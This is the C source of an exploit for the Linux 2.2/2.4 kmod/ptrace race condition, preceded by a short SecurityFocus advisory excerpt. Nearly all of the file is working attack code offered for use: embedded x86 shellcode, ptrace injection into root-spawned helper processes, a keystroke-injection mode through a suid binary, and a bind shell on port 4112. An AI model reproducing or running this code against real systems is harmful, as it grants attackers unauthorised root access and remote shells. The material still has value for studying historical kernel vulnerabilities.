/*
source: http://www.securityfocus.com/bid/7112/info

A vulnerability has been discovered in the Linux kernel which can be exploited using the ptrace() system call. By attaching to an incorrectly configured root process, during a specific time window, it may be possible for an attacker to gain superuser privileges.

The problem occurs due to the kernel failing to restrict trace permissions on specific root spawned processes.

This vulnerability affects both the 2.2 and 2.4 Linux kernel trees.
*/

/* lame, oversophisticated local root exploit for kmod/ptrace bug in linux
 * 2.2 and 2.4
 * 
 * have fun
 */

#define ANY_SUID	"/usr/bin/passwd"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <linux/user.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <asm/ioctls.h>
#include <getopt.h>

// user settings:

int randpids=0;

#define M_SIMPLE		0
#define M_DOUBLE		1
#define M_BIND			2

int mode=M_SIMPLE;
char * bin=NULL;

struct stat me;
int chldpid;
int hackpid;

// flags
int sf=0;
int u2=0;

void killed(int a) { u2=1; }
void synch(int x){ sf=1; }

// shellcode to inject
unsigned char shcode[1024];

char ptrace_code[]="\x31\xc0\xb0\x1a\x31\xdb\xb3\x10\x89\xf9"
        "\xcd\x80\x85\xc0\x75\x41\xb0\x72\x89\xfb\x31\xc9\x31\xd2\x31\xf6"
        "\xcd\x80\x31\xc0\xb0\x1a\x31\xdb\xb3\x03\x89\xf9\xb2\x30\x89\xe6"
        "\xcd\x80\x8b\x14\x24\xeb\x36\x5d\x31\xc0\xb0\xFF\x89\xc7\x83\xc5"
        "\xfc\x8b\x75\x04\x31\xc0\xb0\x1a\xb3\x04\xcd\x80\x4f\x83\xed\xfc"
        "\x83\xea\xfc\x85\xff\x75\xea\x31\xc0\xb0\x1a\x31\xdb\xb3\x11\x31"
        "\xd2\x31\xf6\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xc5\xff"
        "\xff\xff";

char execve_tty_code[]=
	"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xb0\x2e\xcd\x80\x31\xc0\x50\x68"
        "\x2f\x74\x74\x79\x68\x2f\x64\x65\x76\x89\xe3\xb0\x05\x31\xc9\x66"
        "\xb9\x41\x04\x31\xd2\x66\xba\xa4\x01\xcd\x80\x89\xc3\x31\xc0\xb0"
        "\x3f\x31\xc9\xb1\x01\xcd\x80\x31\xc0\x50\xeb\x13\x89\xe1\x8d\x54"
        "\x24\x04\x5b\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8"
        "\xe8\xff\xff\xff";

char execve_code[]="\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xb0\x2e\xcd\x80\xb0\x46"
        "\x31\xc0\x50\xeb\x13\x89\xe1\x8d\x54\x24\x04\x5b\xb0\x0b\xcd\x80"
        "\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe8\xff\xff\xff";

char bind_code[]=
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xb0\x2e\xcd\x80\x31\xc0\x50\x40"
        "\x50\x40\x50\x8d\x58\xff\x89\xe1\xb0\x66\xcd\x80\x83\xec\xf4\x89"
        "\xc7\x31\xc0\xb0\x04\x50\x89\xe0\x83\xc0\xf4\x50\x31\xc0\xb0\x02"
        "\x50\x48\x50\x57\x31\xdb\xb3\x0e\x89\xe1\xb0\x66\xcd\x80\x83\xec"
        "\xec\x31\xc0\x50\x66\xb8\x10\x10\xc1\xe0\x10\xb0\x02\x50\x89\xe6"
        "\x31\xc0\xb0\x10\x50\x56\x57\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x83"
        "\xec\xec\x85\xc0\x75\x59\xb0\x01\x50\x57\x89\xe1\xb0\x66\xb3\x04"
        "\xcd\x80\x83\xec\xf8\x31\xc0\x50\x50\x57\x89\xe1\xb0\x66\xb3\x05"
        "\xcd\x80\x89\xc3\x83\xec\xf4\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x74"
        "\x08\x31\xc0\xb0\x06\xcd\x80\xeb\xdc\x31\xc0\xb0\x3f\x31\xc9\xcd"
        "\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31"
        "\xc0\x50\xeb\x13\x89\xe1\x8d\x54\x24\x04\x5b\xb0\x0b\xcd\x80\x31"
        "\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe8\xff\xff\xff";

// generate shellcode that sets %edi to pid 
int pidcode(unsigned char * tgt, unsigned short pid)
{
fprintf(stderr, "pid=%d=0x%08x\n", pid, pid);
tgt[0]=0x31; tgt[1]=0xff;
tgt+=2;
	if((pid & 0xff) && (pid & 0xff00)){
	tgt[0]=0x66; tgt[1]=0xbf;
	*((unsigned short*)(tgt+2))=pid;
	return 6;
	}else{
	int n=2;

		if(pid & 0xff00){
		tgt[0]=0xB0; tgt[1]=(pid>>8);
		tgt+=2; n+=2;
		}
		
	memcpy(tgt,"\xC1\xE0\x08", 3); tgt+=3; n+=3;
	
		if(pid & 0xff){
		tgt[0]=0xB0; tgt[1]=pid;
		tgt+=2; n+=2;
		}
	tgt[0]=0x89; tgt[1]=0xC7;
	return n+2;
	}
}

void mkcode(unsigned short pid)
{
int i=0;
unsigned char *c=shcode;
c+=pidcode(c, pid);
strcpy(c, ptrace_code);
c[53]=(sizeof(execve_code)+strlen(bin)+4)/4;
strcat(c, execve_code);
strcat(c, bin);
}

//------------------------

void hack(int pid)
{
int i;
struct user_regs_struct r;
char b1[100]; struct stat st;
int len=strlen(shcode);

	if(kill(pid, 0)) return;

sprintf(b1, "/proc/%d/exe", pid);
	if(stat(b1, &st)) return;

	if(st.st_ino!=me.st_ino || st.st_dev!=me.st_dev) return;
	
	if(ptrace(PTRACE_ATTACH, pid, 0, 0)) return;
	while(ptrace(PTRACE_GETREGS, pid, NULL, &r));
fprintf(stderr, "\033[1;33m+ %d\033[0m\n", pid);
	
	if(ptrace(PTRACE_SYSCALL, pid, 0, 0)) goto fail;
	while(ptrace(PTRACE_GETREGS, pid, NULL, &r));
		
	for (i=0; i<=len; i+=4)
	if(ptrace(PTRACE_POKETEXT, pid, r.eip+i, *(int*)(shcode+i))) goto fail;

kill(chldpid, 9);
ptrace(PTRACE_DETACH, pid, 0, 0);
fprintf(stderr, "\033[1;32m- %d ok!\033[0m\n", pid);

	if(mode==M_DOUBLE){
	char commands[1024];
	char * c=commands;
	kill(hackpid, SIGCONT);
	sprintf(commands, "\nexport TERM='%s'\nreset\nid\n", getenv("TERM"));
		while(*c) { ioctl(0, TIOCSTI, c++); }
	
	waitpid(hackpid, 0, 0);
	}

exit(0);

fail:
ptrace(PTRACE_DETACH, pid, 0, 0);
kill(pid, SIGCONT);
}

void usage(char * cmd)
{
fprintf(stderr, "Usage: %s [-d] [-b] [-r] [-s] [-c executable]\n"
"\t-d\t-- use double-ptrace method (to run interactive programs)\n"
"\t-b\t-- start bindshell on port 4112\n"
"\t-r\t-- support randomized pids\n"
"\t-c\t-- choose executable to start\n"
"\t-s\t-- single-shot mode - abort if unsuccessful at the first try\n", cmd);
exit(0);
}

int main(int ac, char ** av, char ** env)
{
int single=0;
char c;
int mypid=getpid();
fprintf(stderr, "Linux kmod + ptrace local root exploit by <anszom@v-lo.krakow.pl>\n\n");
	if(stat("/proc/self/exe", &me) && stat(av[0], &me)){
	perror("stat(myself)");
	return 0;
	}

	while((c=getopt(ac, av, "sbdrc:"))!=EOF) switch(c) {
	case 'd': mode=M_DOUBLE; break;
	case 'b': mode=M_BIND; break;
	case 'r': randpids=1; break;
	case 'c': bin=optarg; break;
	case 's': single=1; break;
	default: usage(av[0]);
	}

	if(ac!=optind) usage(av[0]);

	if(!bin){
		if(mode!=M_SIMPLE) bin="/bin/sh";
		else{
		struct stat qpa;
			if(stat((bin="/bin/id"), &qpa)) bin="/usr/bin/id";
		}
	}

signal(SIGUSR1, synch);

hackpid=0;
	switch(mode){
	case M_SIMPLE:
	fprintf(stderr, "=> Simple mode, executing %s > /dev/tty\n", bin);
	strcpy(shcode, execve_tty_code);
	strcat(shcode, bin);
	break;

	case M_DOUBLE:
	fprintf(stderr, "=> Double-ptrace mode, executing %s, suid-helper %s\n",
			bin, ANY_SUID);
		if((hackpid=fork())==0){
		char *ble[]={ANY_SUID, NULL};
		fprintf(stderr, "Starting suid program %s\n", ANY_SUID);
		kill(getppid(), SIGUSR1);
		execve(ble[0], ble, env);
		kill(getppid(), 9);
		perror("execve(SUID)");
		_exit(0);
		}

		while(!sf);

	usleep(100000);
	kill(hackpid, SIGSTOP);
	mkcode(hackpid);
	break;

	case M_BIND:
	fprintf(stderr, "=> portbind mode, executing %s on port 4112\n", bin);

	strcpy(shcode, bind_code);
	strcat(shcode, bin);
	break;	
	}
fprintf(stderr, "sizeof(shellcode)=%d\n", strlen(shcode));
	
signal(SIGUSR2, killed);

	if(randpids){
	fprintf(stderr, "\033[1;31m"
"Randomized pids support enabled... be patient or load the system heavily,\n"
"this method does more brute-forcing\033[0m\n");
	}

again:
sf=0;
	if((chldpid=fork())==0){
	int q;
	kill(getppid(), SIGUSR1);
		while(!sf);

	fprintf(stderr, "=> Child process started");
		for(q=0;q<10;++q){
		fprintf(stderr, ".");
		socket(22,0,0);
		}
	fprintf(stderr, "\n");
	kill(getppid(), SIGUSR2);
	_exit(0);
	}

	while(!sf);
kill(chldpid, SIGUSR1);

	for(;;){
	int q;
		if(randpids){
			for(q=1;q<30000;++q)
			if(q!=chldpid && q!=mypid && q!=hackpid) hack(q);
		}else{
			for(q=chldpid+1;q<chldpid+10;q++) hack(q);
		}

		if(u2){
		u2=0;
			if(single) break;
		goto again;
		}
	}
fprintf(stderr, "Failed\n");
return 1;
}

// M$ sucks
// 
// http://bezkitu.com/